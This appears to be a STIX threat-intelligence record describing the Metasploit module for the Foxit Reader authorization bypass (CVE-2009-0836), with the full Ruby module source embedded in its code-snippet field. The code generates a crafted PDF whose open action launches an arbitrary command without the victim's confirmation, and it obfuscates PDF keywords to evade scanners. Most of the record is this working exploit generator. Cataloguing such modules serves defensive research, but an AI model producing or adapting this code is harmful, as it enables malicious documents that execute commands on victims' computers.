{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a37c2521-b640-4ac9-9f57-0d84c78cba5c",
    "created": "2024-08-14T16:32:52.90306Z",
    "modified": "2024-08-14T16:32:52.903064Z",
    "name": "Foxit Reader Authorization Bypass",
    "description": " This module exploits an authorization bypass vulnerability in Foxit Reader build 1120. When an attacker creates a specially crafted pdf file containing an Open/Execute action, arbitrary commands can be executed without confirmation from the victim.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/pdf/foxit/authbypass.rb",
            "external_id": "authbypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0836"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Foxit Reader Authorization Bypass',\n      'Description'    => %q{\n          This module exploits an authorization bypass vulnerability in Foxit Reader\n        build 1120. When an attacker creates a specially crafted pdf file containing\n        an Open/Execute action, arbitrary commands can be executed without confirmation\n        from the victim.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC', 'Didier Stevens <didier.stevens[at]gmail.com>', ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-0836' ],\n          [ 'OSVDB', '55615'],\n          [ 'BID', '34035' ],\n        ],\n      'DisclosureDate' => '2009-03-09'))\n\n    register_options(\n      [\n        OptString.new('CMD',        [ false, 'The command to execute.', '/C/Windows/System32/calc.exe']),\n        OptString.new('FILENAME',   [ false, 'The file name.',  'msf.pdf'])\n      ])\n\n  end\n\n  def run\n    exec = datastore['CMD']\n\n    # Create the pdf\n    pdf = make_pdf(exec)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n\n    file_create(pdf)\n  end\n\n  #http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/\n  def n_obfu(str)\n    result = \"\"\n    str.scan(/./u) do |c|\n      if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'\n        result << \"#%x\" % c.unpack('C*')[0]\n      else\n        result << c\n      end\n    end\n    result\n  end\n\n  def random_non_ascii_string(count)\n    result = \"\"\n    count.times do\n      result << (rand(128) + 128).chr\n    end\n    result\n  end\n\n  def io_def(id)\n    \"%d 0 obj\" % id\n  end\n\n  def io_ref(id)\n    \"%d 0 R\" % id\n  end\n\n  def make_pdf(exec)\n\n    xref = []\n    eol = \"\\x0d\\x0a\"\n    endobj = \"endobj\" << eol\n\n    # Randomize PDF version?\n    pdf = \"%%PDF-%d.%d\" % [1 + rand(2), 1 + rand(5)] << eol\n    pdf << \"%\" << random_non_ascii_string(4) << eol\n    xref << pdf.length\n    pdf << io_def(1) << n_obfu(\"<</Type/Catalog/Outlines \") << io_ref(2) << n_obfu(\"/Pages \") << io_ref(3) << n_obfu(\"/OpenAction \") << io_ref(5) << \">>\" << endobj\n    xref << pdf.length\n    pdf << io_def(2) << n_obfu(\"<</Type/Outlines/Count 0>>\") << endobj\n    xref << pdf.length\n    pdf << io_def(3) << n_obfu(\"<</Type/Pages/Kids[\") << io_ref(4) << n_obfu(\"]/Count 1>>\") << endobj\n    xref << pdf.length\n    pdf << io_def(4) << n_obfu(\"<</Type/Page/Parent \") << io_ref(3) << n_obfu(\"/MediaBox[0 0 612 792]>>\") << endobj\n    xref << pdf.length\n    pdf << io_def(5) << \"<</Type/Action/S/Launch/F << /F(#{exec})>>/NewWindow true\\n\" + io_ref(6) + \">>\" << endobj\n    xref << pdf.length\n    pdf << endobj\n    xrefPosition = pdf.length\n    pdf << \"xref\" << eol\n    pdf << \"0 %d\" % (xref.length + 1) << eol\n    pdf << \"0000000000 65535 f\" << eol\n    xref.each do |index|\n      pdf << \"%010d 00000 n\" % index << eol\n    end\n    pdf << \"trailer\" << n_obfu(\"<</Size %d/Root \" % (xref.length + 1)) << io_ref(1) << \">>\" << eol\n    pdf << \"startxref\" << eol\n    pdf << xrefPosition.to_s() << eol\n    pdf << \"%%EOF\" << eol\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-03-09"
}